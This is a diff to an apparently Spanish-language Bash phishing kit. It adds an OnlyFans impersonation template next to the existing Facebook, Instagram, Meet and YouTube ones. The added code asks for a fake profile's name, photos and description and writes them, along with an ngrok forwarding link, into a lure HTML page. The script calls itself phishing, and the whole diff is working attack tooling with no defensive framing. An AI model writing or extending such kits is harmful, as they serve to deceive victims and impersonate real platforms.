@@ -114,6 +114,7 @@ select_template() {
         printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m\n"
         printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Meet\e[0m\n"
         printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Youtube\e[0m\n"
+		printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Onlyfans\e[0m\n"
         
         default_option_template="1"
         read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Elije una plantilla: [Por defecto es 1] \e[0m' option_tem
@@ -129,7 +130,7 @@ select_template() {
             cp $foto_perfil_facebook templates/facebook/foto_perfil.jpeg
             foto_perfil_facebook='templates/facebook/foto_perfil.jpeg'
             read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la descripción de la publicación: \e[0m' descripcion_facebook
-            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la foto de la publicación: \e[0m' foto_publicacion_facebook
+            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Ingresa la ruta de la foto de la publicación: \e[0m' foto_publicacion_facebook
             mv "$foto_publicacion_facebook" "${foto_publicacion_facebook// /-}" -n
             cp $foto_publicacion_facebook templates/facebook/foto_publicacion.jpeg
             foto_publicacion_facebook='templates/facebook/foto_publicacion.jpeg'
@@ -165,6 +166,22 @@ select_template() {
         elif [[ $option_tem -eq 5 ]]; then
             printf " Youtube Phising aún está en desarrollo"
             ruta_template="youtube/youtube.html"
+        elif [[ $option_tem -eq 6 ]]; then
+            printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Plantilla Onlyfans elegida \e[0m\n"
+            
+			echo "Ingresa el nombre del perfil:"
+			read  nombre_perfil_onlyfans
+			echo "Ingresa el nombre de usuario:"
+			read  nombre_usuario_onlyfans
+            echo "Ingresa la ruta de la foto de perfil:"
+			read fotoPerfil
+            
+			echo "Ingresa la descripción del perfil:"
+            read  descripcion_onlyfans
+			echo "Ingresa la ruta de la foto de portada:"
+            read fotoPortada
+            
+            ruta_template="onlyfans/onlyfans.html"
         
         else
             printf "\e[1;93m [!] ¡Opción de plantilla no válida! Inténtalo otra vez\e[0m\n"
@@ -240,7 +257,16 @@ payload_ngrok() {
     elif [[ $option_tem -eq 4 ]]; then
         sed 's+Nombre_de_la_reunion+'$Nombre_de_la_reunion'+g' templates/meet/meet_t.html > templates/meet/meet.html
         sed -i 's+Nombre_personas_conectadas+'$Nombre_personas_conectadas'+1' templates/meet/meet.html
-
+		
+	elif [[ $option_tem -eq 6 ]]; then 
+		fotoPerfil=$link'/'$fotoPerfil
+        fotoPortada=$link'/'$fotoPortada
+		sed 's+nombre_del_perfil+'$nombre_perfil_onlyfans'+g' templates/onlyfans/onlyfans_t.html > templates/onlyfans/onlyfans.html
+		sed -i 's+nombre_de_usuario+'$nombre_usuario_onlyfans'+g' templates/onlyfans/onlyfans.html
+		sed -i 's+foto_perfil+'$fotoPerfil'+g' templates/onlyfans/onlyfans.html
+		sed -i 's+descripcion_onlyfans+'$descripcion_onlyfans'+g' templates/onlyfans/onlyfans.html
+		sed -i 's+foto_portada+'$fotoPortada'+g' templates/onlyfans/onlyfans.html
+  
     else
         sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
         sed 's+live_yt_tv+'$Nombre_de_la_reunion'+g' index3.html > index2.html
